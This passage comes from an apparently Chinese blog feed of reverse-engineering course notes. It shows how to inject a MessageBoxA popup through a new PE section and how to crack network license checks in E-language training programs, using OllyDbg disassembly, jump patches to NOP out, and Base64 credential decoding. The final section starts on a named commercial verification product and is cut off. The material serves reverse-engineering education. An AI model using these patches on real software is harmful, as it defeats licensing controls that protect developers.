title="汉化"><img src="/posts/7cd35487/%E6%B1%89%E5%8C%96%E5%89%8D.png" class="" title="汉化前"><img src="/posts/7cd35487/%E6%B1%89%E5%8C%96%E5%90%8E.png" class="" title="汉化后"><h1 id="6-增加弹窗"><a href="#6-增加弹窗" class="headerlink" title="6. 增加弹窗"></a>6. 增加弹窗</h1><p>用Stud_PE载入程序，在函数那里找user32模块的<code>MessageBoxA</code>函数，如果没有则右键-&gt;add new import，dll选择user32.dll的路径(在吾爱虚拟机中路径为C:\WINDOWS\system32\user32.dll)，选择<code>MessageBoxA</code>函数，添加到列表。RVA为<code>1C3173</code>。</p><img src="/posts/7cd35487/%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0.png" class="" title="添加MessageBoxA"><p>在区段那里新增一个区段。原始大小、虚拟大小为1000，区段数据选择“用空字节填充区段”。区段的RVA为<code>1C4000</code>。再用OD载入去到<code>5C4000</code>处编写代码。</p><p>MeaagexBoxA有4个参数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WINUSERAPI <span class="type">int</span> WINAPI <span class="title function_">MessageBoxA</span><span class="params">(</span></span><br><span class="line"><span class="params">HWND hWnd,<span class="comment">//获取父句柄</span></span></span><br><span class="line"><span class="params">LPCWSTR lpText,<span class="comment">//文本信息</span></span></span><br><span class="line"><span class="params">LPCWSTR lpCaption,<span class="comment">//标题</span></span></span><br><span class="line"><span class="params">UINT uType)</span>;<span class="comment">//风格</span></span><br></pre></td></tr></table></figure><p>在OD中，是从下往上push参数的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push 0;0表示只有一个确认键</span><br><span class="line">push 地址;标题</span><br><span class="line">push 地址  ;文本</span><br><span class="line">push 0;0表示没有父句柄</span><br><span class="line">call dword ptr ds:[5C3173];MessageBoxA的VA地址</span><br></pre></td></tr></table></figure><p>地址可以是这个区段任意某个位置。标题和文本在数据窗口修改。修改完后会自动在反汇编窗口补上代码。别忘了执行完<code>MessageBoxA</code>后跳回OEP执行主程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp 5025A6</span><br></pre></td></tr></table></figure><p>复制到可执行文件，保存，用LoadPE或Stud_PE修改入口点为<code>1C4000</code>。</p><p>MessageBoxW一样操作。</p><img src="/posts/7cd35487/%E5%A2%9E%E5%8A%A0%E5%BC%B9%E7%AA%97.png" class="" title="增加弹窗">]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;1-了解Windows-API&quot;&gt;&lt;a href=&quot;#1-了解Windows-API&quot; class=&quot;headerlink&quot; title=&quot;1. 了解Windows API&quot;&gt;&lt;/a&gt;1. 了解Windows API&lt;/h1&gt;&lt;p&gt;消息框：MessageBoxA/W（Ansi[ASCII]/WideChar[Unicode]）&lt;/p&gt;
&lt;p&gt;弹页面：&lt;/p&gt;
&lt;p&gt;ShellExecuteA/W：open url——控制台执行&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="OllyDbg" scheme="http://example.com/tags/OllyDbg/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第七课——常见的网络验证</title>
    <link href="http://example.com/posts/a4cc5112.html"/>
    <id>http://example.com/posts/a4cc5112.html</id>
    <published>2022-04-05T01:29:28.092Z</published>
    <updated>2022-04-11T05:25:53.923Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-基础知识"><a href="#1-基础知识" class="headerlink" title="1. 基础知识"></a>1. 基础知识</h1><h2 id="1-1-协议"><a href="#1-1-协议" class="headerlink" title="1.1 协议"></a>1.1 协议</h2><p>网络验证协议分为UDP和TCP协议。</p><p>目前市面上流行的网络验证一半都是TCP协议的。</p><p>采用TCP协议程序发送数据所用API为：send，接收数据所用API为：recv</p><p>采用UDP协议程序发送数据所用API为：WSASend，接收数据所用API为：WSARecv</p><span id="more"></span><p>在分析封包时，了解程序使用的协议类型，采用相对应抓包工具。有的抓包工具只能抓到TCP协议发送的封包数据，比如用易语言网截所写的抓包工具，那种工具只能抓到TCP协议的封包。</p><h2 id="1-2-网络验证类型"><a href="#1-2-网络验证类型" class="headerlink" title="1.2 网络验证类型"></a>1.2 网络验证类型</h2><p>网络验证类型常见的为：Asp验证，PHP验证，云验证，exe程序互相通信验证。</p><p>判断验证类型的例子：</p><p>Asp验证 飘零网络验证</p><p>PHP验证 可可网络验证</p><p>云验证  注册宝网络验证</p><h2 id="1-3-课程流程"><a href="#1-3-课程流程" class="headerlink" title="1.3 课程流程"></a>1.3 课程流程</h2><p>利用新浪微博建立一个简单的未加密用户名密码验证，讲解起验证形成过程，讲解后破解(课件1)</p><p>利用新浪微博建立一个简单的加密用户名密码验证，讲解起验证形成过程，讲解后破解(课件2)</p><p>讲解易语言编译出客户端，服务端验证形成过程</p><p>未加密验证用户密码</p><p>BASE64加密验证用户密码到期时间</p><p>当程序无壳时，可以用查找字符串方法寻找敏感字符串；加壳时，可以用易语言的按钮事件：FF55FC5F5E(死码)，前提是这个程序是用易语言编写的。下断运行，F7步入就是主程序代码。</p><h1 id="2-实例"><a href="#2-实例" class="headerlink" title="2. 实例"></a>2. 实例</h1><p>这些程序都是用易语言编写的，所以也可以当作是易语言专栏吧。</p><h2 id="2-1-网页未加密"><a href="#2-1-网页未加密" class="headerlink" title="2.1 网页未加密"></a>2.1 网页未加密</h2><p>破解简单说下：</p><p>程序运行一下知道大概流程，载入OD寻找敏感字符串。发现登录成功在很大的一个循环里，登录失败在循环外。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">004025D7  |.  895D C0       |mov [local.16],ebx</span><br><span class="line">004025DA  |.  8B5D C0       |mov ebx,[local.16]</span><br><span class="line">004025DD  |.  FF33          |push dword ptr ds:[ebx]</span><br><span class="line">004025DF  |.  68 766C4800   |push 课件1_网.00486C76                     ;  到期时间：</span><br><span class="line">004025E4  |.  B9 02000000   |mov ecx,0x2</span><br><span class="line">004025E9  |.  E8 BEF4FFFF   |call 课件1_网.00401AAC</span><br><span class="line">004025EE  |.  83C4 08       |add esp,0x8</span><br><span class="line">004025F1  |.  8945 BC       |mov [local.17],eax</span><br><span class="line">004025F4  |.  6A 00         |push 0x0</span><br><span class="line">004025F6  |.  6A 00         |push 0x0</span><br><span class="line">004025F8  |.  6A 00         |push 0x0</span><br><span class="line">004025FA  |.  68 04000080   |push 0x80000004</span><br><span class="line">004025FF  |.  6A 00         |push 0x0</span><br><span class="line">00402601  |.  68 816C4800   |push 课件1_网.00486C81                     ;  登录成功</span><br><span class="line">00402606  |.  68 01030080   |push 0x80000301</span><br><span class="line">0040260B  |.  6A 00         |push 0x0</span><br><span class="line">0040260D  |.  68 00000000   |push 0x0</span><br><span class="line">00402612  |.  68 04000080   |push 0x80000004</span><br><span class="line">00402617  |.  6A 00         |push 0x0</span><br><span class="line">00402619  |.  8B45 BC       |mov eax,[local.17]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00402655  |&gt; \83C4 0C       add esp,0xC</span><br><span class="line">00402658  |.  6A 00         push 0x0</span><br><span class="line">0040265A  |.  6A 00         push 0x0</span><br><span class="line">0040265C  |.  6A 00         push 0x0</span><br><span class="line">0040265E  |.  68 04000080   push 0x80000004</span><br><span class="line">00402663  |.  6A 00         push 0x0</span><br><span class="line">00402665  |.  68 8A6C4800   push 课件1_网.00486C8A                      ;  登录失败</span><br><span class="line">0040266A  |.  68 01030080   push 0x80000301</span><br><span class="line">0040266F  |.  6A 00         push 0x0</span><br><span class="line">00402671  |.  68 00000000   push 0x0</span><br><span class="line">00402676  |.  68 04000080   push 0x80000004</span><br><span class="line">0040267B  |.  6A 00         push 0x0</span><br><span class="line">0040267D  |.  68 936C4800   push 课件1_网.00486C93                      ;  账号密码不正确</span><br><span class="line">00402682  |.  68 04000000   push 0x4</span><br></pre></td></tr></table></figure><p>猜测登录时，程序先比对输入的用户名和某网页的所有用户名，如果存在再比对这个用户名的密码。两个都比对成功则执行登录成功的代码。</p><p>输入假用户名和假密码进入循环。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00402485  |.  50            |push eax</span><br><span class="line">00402486  |.  3BC8          |cmp ecx,eax</span><br><span class="line">00402488  |.  0F8F C7010000 |jg 课件1_网.00402655                       ;  判断输入是否为空</span><br><span class="line">0040248E  |.  8B5D D0       |mov ebx,[local.12]</span><br><span class="line">00402491  |.  E8 ADEBFFFF   |call 课件1_网.00401043</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0040250B  |.  83C4 04       |add esp,0x4</span><br><span class="line">0040250E  |&gt;  837D B8 00    |cmp [local.18],0x0</span><br><span class="line">00402512  |.  0F84 35010000 |je 课件1_网.0040264D                       ;  这个跳转跳出循环外，不能跳转</span><br><span class="line">00402518  |.  8B5D CC       |mov ebx,[local.13]</span><br><span class="line">0040251B  |.  E8 23EBFFFF   |call 课件1_网.00401043</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00402595  |.  83C4 04       |add esp,0x4</span><br><span class="line">00402598  |&gt;  837D B8 00    |cmp [local.18],0x0</span><br><span class="line">0040259C  |.  0F84 AB000000 |je 课件1_网.0040264D                       ;  这个跳转跳出循环外，不能跳转</span><br><span class="line">004025A2  |.  8B5D C8       |mov ebx,[local.14]</span><br><span class="line">004025A5  |.  E8 99EAFFFF   |call 课件1_网.00401043</span><br></pre></td></tr></table></figure><p>将这两个<code>je</code>指令都nop掉，实现破解。</p><p>但这节课的重点不是破解，而是算法流程。</p><p>载入OD，Ctrl+B输入二进制字串<code>FF 55 FC 5F 5E</code>，这是易语言的按钮事件死码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0041E18D  |&gt; \FF55 FC       call [local.1]</span><br><span class="line">0041E190  |.  5F            pop edi                                  ;  kernel32.7C817077</span><br><span class="line">0041E191  |.  5E            pop esi                                  ;  kernel32.7C817077</span><br></pre></td></tr></table></figure><p>F9运行至此处，再F9出现主程序，输入用户名和密码后点击注册，程序再次停在此处，现在F7进入call指令，就是作者编写的易语言代码处了。F8步过跟踪，到这里就是将要访问的网页压栈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401BD1  |.  68 FA6B4800   push 课件1_网.00486BFA                      ;  http://blog.sina.com.cn/s/blog_151e522e60102vy1h.html</span><br></pre></td></tr></table></figure><img src="/posts/a4cc5112/%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5.png" class="" title="访问网页"><p>看着貌似写了一堆奇奇怪怪的东西，先不管它。回到OD继续往下，会发现信息窗口有类似于html的字符串，在信息窗口选中右键-&gt;数据窗口中跟随数值，发现这个程序的操作是把读取网页源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">00177CF0  00 00 00 00 DF 00 00 00 3C 68 74 6D 6C 3E 0D 0A  ....?..&lt;html&gt;..</span><br><span class="line">00177D00  3C 68 65 61 64 3E 0D 0A 3C 73 63 72 69 70 74 20  &lt;head&gt;..&lt;script</span><br><span class="line">00177D10  6C 61 6E 67 75 61 67 65 3D 22 6A 61 76 61 73 63  language=&quot;javasc</span><br><span class="line">00177D20  72 69 70 74 22 3E 73 65 74 54 69 6D 65 6F 75 74  ript&quot;&gt;setTimeout</span><br><span class="line">00177D30  28 22 6C 6F 63 61 74 69 6F 6E 2E 72 65 70 6C 61  (&quot;location.repla</span><br><span class="line">00177D40  63 65 28 6C 6F 63 61 74 69 6F 6E 2E 68 72 65 66  ce(location.href</span><br><span class="line">00177D50  2E 73 70 6C 69 74 28 5C 22 23 5C 22 29 5B 30 5D  .split(\&quot;#\&quot;)[0]</span><br><span class="line">00177D60  29 22 2C 31 30 30 30 29 3B 3C 2F 73 63 72 69 70  )&quot;,1000);&lt;/scrip</span><br><span class="line">00177D70  74 3E 0D 0A 3C 2F 68 65 61 64 3E 0D 0A 3C 69 66  t&gt;..&lt;/head&gt;..&lt;if</span><br><span class="line">00177D80  72 61 6D 65 20 73 72 63 3D 22 68 74 74 70 3A 2F  rame src=&quot;http:/</span><br><span class="line">00177D90  2F 32 32 32 2E 32 30 31 2E 35 34 2E 36 34 3A 38  /222.201.54.64:8</span><br><span class="line">00177DA0  39 2F 66 6C 61 73 68 72 65 64 69 72 2E 68 74 6D  9/flashredir.htm</span><br><span class="line">00177DB0  6C 22 20 66 72 61 6D 65 62 6F 72 64 65 72 3D 30  l&quot; frameborder=0</span><br><span class="line">00177DC0  3E 3C 2F 69 66 72 61 6D 65 3E 0D 0A 3C 2F 68 74  &gt;&lt;/iframe&gt;..&lt;/ht</span><br><span class="line">00177DD0  6D 6C 3E 0D 0A 0D 0A 68 1D 00 1E 00 31 01 08 00  ml&gt;....h..1.</span><br><span class="line">00177DE0  3C 68 74 6D 6C 3E 0D 0A 3C 68 65 61 64 3E 0D 0A  &lt;html&gt;..&lt;head&gt;..</span><br><span class="line">00177DF0  3C 73 63 72 69 70 74 20 6C 61 6E 67 75 61 67 65  &lt;script language</span><br><span class="line">00177E00  3D 22 6A 61 76 61 73 63 72 69 70 74 22 3E 73 65  =&quot;javascript&quot;&gt;se</span><br><span class="line">00177E10  74 54 69 6D 65 6F 75 74 28 22 6C 6F 63 61 74 69  tTimeout(&quot;locati</span><br><span class="line">00177E20  6F 6E 2E 72 65 70 6C 61 63 65 28 6C 6F 63 61 74  on.replace(locat</span><br><span class="line">00177E30  69 6F 6E 2E 68 72 65 66 2E 73 70 6C 69 74 28 5C  ion.href.split(\</span><br><span class="line">00177E40  22 23 5C 22 29 5B 30 5D 29 22 2C 31 30 30 30 29  &quot;#\&quot;)[0])&quot;,1000)</span><br><span class="line">00177E50  3B 3C 2F 73 63 72 69 70 74 3E 0D 0A 3C 2F 68 65  ;&lt;/script&gt;..&lt;/he</span><br><span class="line">00177E60  61 64 3E 0D 0A 3C 69 66 72 61 6D 65 20 73 72 63  ad&gt;..&lt;iframe src</span><br><span class="line">00177E70  3D 22 68 74 74 70 3A 2F 2F 32 32 32 2E 32 30 31  =&quot;http://222.201</span><br><span class="line">00177E80  2E 35 34 2E 36 34 3A 38 39 2F 66 6C 61 73 68 72  .54.64:89/flashr</span><br><span class="line">00177E90  65 64 69 72 2E 68 74 6D 6C 22 20 66 72 61 6D 65  edir.html&quot; frame</span><br><span class="line">00177EA0  62 6F 72 64 65 72 3D 30 3E 3C 2F 69 66 72 61 6D  border=0&gt;&lt;/ifram</span><br><span class="line">00177EB0  65 3E 0D 0A 3C 2F 68 74 6D 6C 3E 0D 0A 0D 0A 00  e&gt;..&lt;/html&gt;.....</span><br></pre></td></tr></table></figure><p>再往下滑看到正文的一些字符串，应该是提取这些字符串之间的字符串，存进内存里。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00401E97  |.  68 536C4800   push 课件1_网.00486C53                      ;  &lt;p&gt;^^^</span><br><span class="line">...</span><br><span class="line">(进入第一个大循环)</span><br><span class="line">00401F82  |.  68 5A6C4800   |push 课件1_网.00486C5A                     ;  $$$</span><br><span class="line">...</span><br><span class="line">00402003  |.  68 5E6C4800   |push 课件1_网.00486C5E                     ;  ###</span><br><span class="line">...</span><br><span class="line">00402084  |.  68 626C4800   |push 课件1_网.00486C62                     ;  ***</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(进入第二个大循环)</span><br><span class="line">00402485  |.  50            |push eax</span><br><span class="line">00402486  |.  3BC8          |cmp ecx,eax</span><br><span class="line">00402488  |.  0F8F C7010000 |jg 课件1_网.00402655                       ;  判断输入是否为空</span><br><span class="line">...</span><br><span class="line">004024D9  |.  83C4 10       |add esp,0x10                            ;  输入的用户名</span><br><span class="line">004024DC  |.  8945 BC       |mov [local.17],eax                      ;  存进local.17</span><br></pre></td></tr></table></figure><p>此时发现寄存器窗口的eax也是我们输入的用户名，右键-&gt;数据窗口中跟随。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00169970  61 62 63 00 01 00 00 00 02 00 02 00 3C 01 0A 00  abc......&lt;..</span><br><span class="line">00169980  61 62 63 39 39 00 37 00 02 00 02 00 22 01 0B 00  abc99.7...&quot;.</span><br><span class="line">00169990  61 62 63 31 00 01 15 00 24 00 02 00 20 01 0C 00  abc1..$.. ..</span><br></pre></td></tr></table></figure><p>发现上面是\^\^\^和$$$之间的内容“abc”，下面也是\^\^\^和$$$之间的内容“abc1”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00402512     /0F84 35010000 je 课件1_网.0040264D                        ;  不能跳转</span><br></pre></td></tr></table></figure><p>绕过这个跳转继续往下，到达这里后eax的值为111，是$$$和###之间的内容“111”，并且对应网页，前面的字符串是“abc”。数据窗口这一行的上面也是“abc”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0040255E  |.  E8 5F100000   |call 课件1_网.004035C2</span><br><span class="line">00402563  |.  83C4 10       |add esp,0x10</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00169970  61 62 63 00 01 00 00 00 02 00 02 00 3C 01 0C 00  abc......&lt;..</span><br><span class="line">00169980  31 31 31 00 39 00 37 00 02 00 02 00 22 01 0B 00  111.9.7...&quot;.</span><br><span class="line">00169990  61 62 63 31 00 01 15 00 24 00 02 00 20 01 0C 00  abc1..$.. ..</span><br></pre></td></tr></table></figure><p>继续往下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040259C     /0F84 AB000000 je 课件1_网.0040264D                        ;  不能跳转</span><br></pre></td></tr></table></figure><p>绕过跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00402630  |.  E8 870F0000   |call 课件1_网.004035BC</span><br></pre></td></tr></table></figure><p>运行到这里时弹窗说登录成功，到期时间无法显示。但可以猜测<code>^^^abc$$$111###30***</code>这一串中的“30”应该是到期时间。所以这一串奇怪的字符其实包含了用户名、密码和到期时间。</p><img src="/posts/a4cc5112/%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png" class="" title="登录成功"><h2 id="2-2-网页加密"><a href="#2-2-网页加密" class="headerlink" title="2.2 网页加密"></a>2.2 网页加密</h2><p>破解同样是修改两个跳转指令。</p><p>算法分析：与2.1同样操作来到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004019C0  |.  68 CD9D4800   push 课件2_网.00489DCD                      ;  http://blog.sina.com.cn/s/blog_151e522e60102vzdy.html</span><br></pre></td></tr></table></figure><img src="/posts/a4cc5112/%E7%BD%91%E9%A1%B5%E5%8A%A0%E5%AF%86.png" class="" title="网页加密"><p>这时直接在程序按照分隔符输入字符串是不对的。看到字符串有等号很明显是Base64加密。拿去解码即可得真正的用户名、密码和到期时间。</p><img src="/posts/a4cc5112/base64%E8%A7%A3%E7%A0%81.png" class="" title="base64解码"><p>但我们这个是分析流程，所以还是继续往下看看吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00401F22  |.  83C4 1C       |add esp,0x1C                            ;  加密后的用户名(第一次循环用户名为空，第二次才显示第一行的用户名)</span><br><span class="line">00401F25  |.  8945 AC       |mov [local.21],eax</span><br><span class="line">00401F28  |.  8D45 AC       |lea eax,[local.21]</span><br><span class="line">00401F2B  |.  50            |push eax</span><br><span class="line">00401F2C  |.  68 08FA4A00   |push 课件2_网.004AFA08</span><br><span class="line">00401F31  |.  8B0424        |mov eax,dword ptr ss:[esp]</span><br><span class="line">00401F34  |.  8B00          |mov eax,dword ptr ds:[eax]</span><br><span class="line">00401F36  |.  8B00          |mov eax,dword ptr ds:[eax]</span><br><span class="line">00401F38  |.  FF50 0C       |call dword ptr ds:[eax+0xC]             ;  base64解密出来的用户名</span><br><span class="line">00401F3B  |.  8945 A8       |mov [local.22],eax</span><br></pre></td></tr></table></figure><p>执行完base64解密的函数后，eax右键-&gt;数据窗口中跟随，就可看到解密出来的“abc”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">001702A8  01 00 00 00 03 00 00 00 61 62 63 00 75 01 08 00  ......abc.u.</span><br></pre></td></tr></table></figure><p>密码和到期时间一样的操作。</p><h2 id="2-3-EXE验证"><a href="#2-3-EXE验证" class="headerlink" title="2.3 EXE验证"></a>2.3 EXE验证</h2><p>爆破：</p><p>开启服务端，再将客户端载入OD，查找敏感字符串或设置按钮事件，找到函数段首下断运行，点击“验证”，程序停在断点处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">004012EB  |. /0F85 99000000 jnz 课件3_易.0040138A                       ;  不能跳</span><br><span class="line">004012F1  |. |8B5D F8       mov ebx,[local.2]</span><br><span class="line">004012F4  |. |E8 0BFDFFFF   call 课件3_易.00401004</span><br><span class="line">004012F9  |. |B8 01000000   mov eax,0x1</span><br><span class="line">004012FE  |. |3BC1          cmp eax,ecx                              ;  课件3_易.00482C3B</span><br><span class="line">00401300  |. |7C 0D         jl short 课件3_易.0040130F</span><br><span class="line">00401302  |. |68 01000000   push 0x1</span><br><span class="line">00401307  |. |E8 4E030000   call 课件3_易.0040165A</span><br><span class="line">0040130C  |. |83C4 04       add esp,0x4</span><br><span class="line">0040130F  |&gt; |C1E0 02       shl eax,0x2</span><br><span class="line">00401312  |. |03D8          add ebx,eax</span><br><span class="line">00401314  |. |895D F4       mov [local.3],ebx</span><br><span class="line">00401317  |. |8B5D F4       mov ebx,[local.3]</span><br><span class="line">0040131A  |. |FF33          push dword ptr ds:[ebx]</span><br><span class="line">0040131C  |. |68 442C4800   push 课件3_易.00482C44                      ;  到期时间：</span><br><span class="line">00401321  |. |B9 02000000   mov ecx,0x2</span><br><span class="line">00401326  |. |E8 01FEFFFF   call 课件3_易.0040112C</span><br></pre></td></tr></table></figure><p>分析算法：与2.4一样，只是没了加密过程。</p><h2 id="2-4-EXE加密验证"><a href="#2-4-EXE加密验证" class="headerlink" title="2.4 EXE加密验证"></a>2.4 EXE加密验证</h2><p>爆破与2.3一样。</p><p>分析算法：</p><p>开头同2.1，F8一步步跟踪。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401E6E  |.  E8 ED250000   call 课件4_易.00404460                      ;  获取输入的用户名</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401EC2  |.  FF50 08       call dword ptr ds:[eax+0x8]              ;  base64加密用户名：YWJj</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401EE6  |.  E8 75250000   call 课件4_易.00404460                      ;  获取输入的密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401F3A  |.  FF50 08       call dword ptr ds:[eax+0x8]              ;  密码base64加密:MTIz</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401F68  |.  8945 E0       mov [local.8],eax                        ;  拼接：YWJj|MTIz</span><br></pre></td></tr></table></figure><p>经过<code>retn</code>后F9运行，程序又回到断点处。这次F7进去代码与之前不同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401B42  |.  83C4 10       add esp,0x10                             ;  【登录失败】|账号密码错误</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401B6B  |.  83C4 10       add esp,0x10                             ;  【登录失败】|账号密码错误</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401C47  |.  68 CD6E4800   push 课件4_易.00486ECD                      ;  【登录成功】</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00401C59  |.  83F8 00       cmp eax,0x0                              ;  登录成功和登录失败相比较</span><br><span class="line">00401C5C      0F85 99000000 jnz 课件4_易.00401CFB                       ;  nop掉</span><br></pre></td></tr></table></figure><h2 id="2-5-EXE加密验证2-0"><a href="#2-5-EXE加密验证2-0" class="headerlink" title="2.5 EXE加密验证2.0"></a>2.5 EXE加密验证2.0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004013C4     /0F85 CC020000 jnz 课件5_易.00401696</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0040147F  |. /0F8C D0010000 jl 课件5_易.00401655</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">004014CE  |. /0F8E 99000000 jle 课件5_易.0040156D</span><br></pre></td></tr></table></figure><p>把这三处都nop掉即可。</p><h2 id="2-6-可可-v9-5"><a href="#2-6-可可-v9-5" class="headerlink" title="2.6 可可 v9.5"></a>2.6 可可 v9.5</h2><p>程序无壳，放心食用。调试选项全选，StrongOD勾选忽略某些异常。下易语言按钮事件断点<code>FF 55 FC 5F 